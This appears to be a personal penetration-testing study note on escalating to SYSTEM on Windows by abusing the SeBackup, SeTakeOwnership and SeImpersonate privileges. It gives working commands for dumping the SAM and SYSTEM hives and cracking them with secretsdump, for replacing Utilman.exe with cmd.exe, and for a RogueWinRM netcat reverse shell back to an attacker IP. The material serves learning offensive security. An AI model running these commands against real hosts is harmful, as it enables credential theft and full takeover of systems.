# Windows — Privilege Abuse (Se* tokens)

`whoami /priv` is the trigger for this note. A **privilege** is a system-level right that lives in your access token, separate from file DACLs — and a handful of them bypass DACLs entirely. Each one below is a specific power; the question is always the same:

> what does SYSTEM touch that I can reach *with this power* — and a file is one of those things, so "read/write/own any file" is effectively "own the host."

Full catalogue of which privileges are exploitable: **[[Security-Terms#^priv2admin|Priv2Admin]]** on GitHub. Only the ones that hand you a path are here.

| Privilege | Power it grants | Path to SYSTEM |
|---|---|---|
| `SeBackup` / `SeRestore` | Read / write **any file**, ignoring ACLs | Dump `SAM`+`SYSTEM` hives → hashes → pass-the-hash |
| `SeTakeOwnership` | Become **owner** of any object → grant yourself rights | Overwrite a binary that runs as SYSTEM |
| `SeImpersonate` / `SeAssignPrimaryToken` | Act under **another user's token** | Force SYSTEM to authenticate to you, steal its token — the "potato" family |

## Enabling the token first

In every case below `whoami /priv` shows the privilege as `Disabled`. That is not a problem — it means *present but not yet activated*; the tool that uses it enables it on demand. **What you need is for the privilege to appear in the list at all.**

It only appears in your **elevated** token. Because of [[Security-Terms#^uac|UAC]], an admin-group account gets two tokens — a filtered one and a full one — and these privileges live only in the full one. So open the console with **"Run as administrator"** before checking; a non-elevated prompt shows a stripped list and none of this works.

## SeBackup / SeRestore — read/write any file

Intended for backup software: read every file for a backup, write every file for a restore, without being an administrator. But "read every file" includes the files where password hashes live.

```cmd
reg save hklm\system C:\Users\<you>\system.hive
```

```cmd
reg save hklm\sam    C:\Users\<you>\sam.hive
```

- `reg save` → uses the backup privilege to copy these ACL-protected hives out as ordinary files.
- both hives → `SAM` holds the local [[Security-Terms#^ntlm|NTLM]] hashes (encrypted); `SYSTEM` holds the boot key that decrypts them. **You need both** — `sam.hive` alone is useless, and forgetting `system.hive` is the common mistake that makes `secretsdump` fail later with a decryption error.

Move both to your box (see [[File-Transfer]]) and extract:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

- `LOCAL` → read from these offline files, not over the network. Omit it and `secretsdump` tries to authenticate to a host called `LOCAL` and fails.

## SeTakeOwnership — own it, then rewrite it

The target is `utilman.exe`: the Ease-of-Access tool on the lock screen, which runs as **SYSTEM before anyone logs in**. Replace it with `cmd.exe` and the accessibility button becomes a SYSTEM shell. (`sethc.exe` — the sticky-keys binary, 5x Shift — is the classic twin of this trick.)

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

```cmd
icacls  C:\Windows\System32\Utilman.exe /grant <you>:F
```

```cmd
copy    C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

- `takeown /f` → makes you the owner. Ownership alone grants **no** rights yet — this is step one of two, and stopping here is the usual mistake.
- `icacls /grant <you>:F` → *because* you now own it, grant yourself Full control. Skip this line and the `copy` fails with `Access is denied.` even though you own the file.
- `copy` → overwrites `Utilman.exe` with `cmd.exe`. Keep the original first on a live host; you are clobbering a system binary.

## SeImpersonate / SeAssignPrimaryToken — steal a token

This is legitimate and everywhere: a service (FTP, IIS, MSSQL) impersonates each connecting user so the OS enforces file permissions. The abuse inverts it. `SeAssignPrimaryToken` is the sibling that launches a **new process** with the stolen token rather than attaching it to a thread; same outcome. This is why a web shell on IIS is usually one step from SYSTEM.

**[[Security-Terms#^potato|RogueWinRM]]** exploits that starting the **[[Security-Terms#^bits|BITS]]** service — which any unprivileged user can do — makes BITS connect to `127.0.0.1:5985` **as SYSTEM**. Port 5985 is [[Security-Terms#^winrm|WinRM]] ([[5985-WinRM]]); if WinRM is not running the port is free, so you plant a fake listener there, trigger BITS, and catch SYSTEM's authentication.

```bash
nc -lvp 4442
```

- Your catch listener on the attack box. `-l` listen, `-v` verbose so you see the connect, `-p` port — and the port must match the `-a` argument below or SYSTEM's shell connects to nothing.

```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <your-ip> 4442"
```

- `-p` → the program to run with the stolen SYSTEM token (`nc64.exe`).
- `-a` → its arguments; `-e cmd.exe <your-ip> <port>` is a reverse shell back to your listener. The port here must equal the `nc -lvp` port above.
